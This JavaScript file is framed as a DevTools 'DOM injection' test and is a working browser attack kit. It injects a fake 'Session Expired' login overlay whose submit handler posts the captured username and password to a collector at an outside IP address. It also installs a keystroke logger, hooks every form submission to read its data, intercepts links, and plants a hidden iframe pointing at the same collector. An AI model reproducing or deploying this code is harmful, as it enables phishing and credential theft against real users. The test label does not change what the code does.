// =============================================================
// TEST 03: DOM Injection — Modify page content from DevTools
// =============================================================
// Tests if console can inject phishing overlays, fake forms, etc.

// --- Test 3.1: Full page phishing overlay ---
var overlay = document.createElement('div');
overlay.id = 'phish-overlay';
overlay.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;">
  <div style="max-width:400px;padding:40px;box-shadow:0 4px 20px rgba(0,0,0,0.15);border-radius:12px;">
    <h2 style="margin:0 0 5px;color:#1a73e8;">Session Expired</h2>
    <p style="color:#666;margin:0 0 20px;">Please re-enter your credentials to continue.</p>
    <form id="phish-form">
      <input type="text" id="phish-user" placeholder="Email or username" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;">
      <input type="password" id="phish-pass" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;">
      <button type="submit" style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:8px;">Sign In</button>
    </form>
    <p style="color:#999;font-size:12px;margin-top:15px;text-align:center;">Protected by enterprise security</p>
  </div>
</div>`;
document.body.appendChild(overlay);
document.getElementById('phish-form').onsubmit = function(e) {
    e.preventDefault();
    var creds = {user: document.getElementById('phish-user').value, pass: document.getElementById('phish-pass').value};
    console.log('[TEST 3.1] CAPTURED CREDENTIALS:', JSON.stringify(creds));
    // Exfiltrate
    fetch('https://158.101.104.214/collect.php?cat=devtools&test=phishing-overlay', {
        method: 'POST', mode: 'no-cors',
        body: JSON.stringify(creds)
    }).catch(()=>{});
    overlay.remove();
};
console.log('[TEST 3.1] Phishing overlay injected');
// To remove: document.getElementById('phish-overlay').remove()

// --- Test 3.2: Inject keylogger ---
var keylog = [];
document.addEventListener('keydown', function logger(e) {
    keylog.push({key: e.key, target: e.target.tagName, time: Date.now()});
    if (keylog.length % 20 === 0) {
        console.log('[TEST 3.2] Keylog buffer (' + keylog.length + ' keys):', JSON.stringify(keylog.slice(-20)));
    }
});
console.log('[TEST 3.2] Keylogger active — type anywhere on the page');

// --- Test 3.3: Hijack all form submissions ---
document.querySelectorAll('form').forEach(function(form, i) {
    form.addEventListener('submit', function(e) {
        var data = new FormData(form);
        var obj = {};
        data.forEach(function(v, k) { obj[k] = v; });
        console.log('[TEST 3.3] FORM #' + i + ' INTERCEPTED:', JSON.stringify(obj));
        // Allow original submission to continue
    });
});
console.log('[TEST 3.3] Form hijack active on', document.querySelectorAll('form').length, 'forms');

// --- Test 3.4: Modify existing links ---
document.querySelectorAll('a').forEach(function(a) {
    a.dataset.originalHref = a.href;
    a.addEventListener('click', function(e) {
        console.log('[TEST 3.4] Link click intercepted. Original:', a.dataset.originalHref);
    });
});
console.log('[TEST 3.4] All links monitored:', document.querySelectorAll('a').length);

// --- Test 3.5: Replace page content entirely ---
// document.documentElement.innerHTML = '<h1>Page Defaced from DevTools</h1>';
console.log('[TEST 3.5] Uncomment above to test full page replacement');

// --- Test 3.6: Inject invisible data capture iframe ---
var hidden = document.createElement('iframe');
hidden.src = 'https://158.101.104.214/collect.php?cat=devtools&test=hidden-iframe';
hidden.style.cssText = 'width:0;height:0;border:0;position:absolute;';
document.body.appendChild(hidden);
console.log('[TEST 3.6] Hidden collector iframe injected');
